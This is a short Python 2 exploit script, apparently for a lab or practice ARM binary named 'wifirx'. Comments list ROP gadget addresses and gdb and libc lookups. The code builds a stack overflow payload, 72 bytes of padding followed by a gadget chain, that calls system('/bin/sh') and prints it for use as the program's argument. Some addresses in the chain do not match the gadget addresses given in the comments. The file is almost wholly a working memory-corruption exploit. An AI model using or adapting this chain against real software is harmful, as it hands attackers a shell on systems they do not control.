#0x044031c4 : pop {r3, pc};
#0x044031a0 : mov r0, r7; blx r3;
#0x044031b0 : pop {r4, r5, r6, r7, r8, sb, sl, pc};
#find &system,+9999999,"/bin/sh" 0x76d77b6c
#$1 = (int (*)(const char *)) 0x76c849c8 <__libc_system>

#gdb -q --args ./wifirx `python wifirxJOP.py`
#x/64xw $sp

from struct import pack

offset = 72

rop_chain = 'A' * offset
rop_chain += pack('I', 0x04403268) # 0x044031b0 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
rop_chain += 'AAAA' * 3 # Padding
rop_chain += pack('I', 0xf7d7ab6c) # "/bin/sh"
rop_chain += 'BBBB' * 3 # Padding
rop_chain += pack('I', 0x04400d80) # 0x044031c4 : pop {r3, pc}
rop_chain += pack('I', 0xf7c879c8) # system
rop_chain += pack('I', 0x04403258) # 0x044031a0 : mov r0, r7; blx r3

print rop_chain